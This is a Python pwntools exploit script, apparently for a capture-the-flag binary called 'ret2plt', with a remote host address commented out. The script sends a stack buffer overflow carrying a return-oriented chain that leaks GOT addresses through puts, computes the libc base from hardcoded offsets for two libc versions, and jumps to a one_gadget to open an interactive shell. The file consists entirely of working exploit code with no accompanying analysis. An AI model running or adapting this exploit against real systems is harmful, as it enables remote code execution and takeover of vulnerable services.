from pwn import *

# 0x00000000004006f3 : pop rdi ; ret
pop_rdi = 0x4006f3
# 0x00000000004004c9 : ret
ret = 0x4004c9
gots = {'puts': 0x601018, 'printf': 0x601020, 'gets': 0x601030, 'setvbuf': 0x601038}
libcs = {}
got_puts = 0x601018
plt_puts = 0x4004e0
got_printf = 0x601020
main = 0x400636
'''
# libc-2.23.so
libc_puts_offset = 0x6f690
libc_system_offset = 0x45390
libc_sh_offset = 0x18cd57
libc_one_gadget_offset = 0x45216
'''

# libc-2.27.so
libc_puts_offset = 0x809c0
libc_system_offset = 0x4f440
libc_sh_offset = 0x1b3e9a
libc_one_gadget_offset = 0x4f2c5


r = process('ret2plt')
#r = remote('140.110.112.77', 2125)
raw_input('debug:')
r.recvuntil('best :')
r.sendline('a' * 0x28 + p64(ret) + p64(main))

for g in gots:
    r.recvuntil('best :')
    r.sendline('a' * 0x28 + p64(pop_rdi) + p64(gots[g]) + p64(plt_puts) + p64(main))
    r.recvline()
    libcs[g] = u64(r.recvline().strip() + '\0\0')
    print('{}: {}'.format(g, hex(libcs[g])))

libc_base = libcs['puts'] - libc_puts_offset
libc_system = libc_base + libc_system_offset
libc_sh = libc_base + libc_sh_offset
print('libc base: {}, libc_system: {}, libc_sh: {}'.format(hex(libc_base), hex(libc_system), hex(libc_sh)))
libc_one_gadget = libc_base + libc_one_gadget_offset

r.recvuntil('best :')
r.sendline('a' * 0x28 + p64(libc_one_gadget))
#r.sendline('a' * 0x28 + p64(ret) + p64(pop_rdi) + p64(libc_sh) + p64(libc_system))
r.interactive()
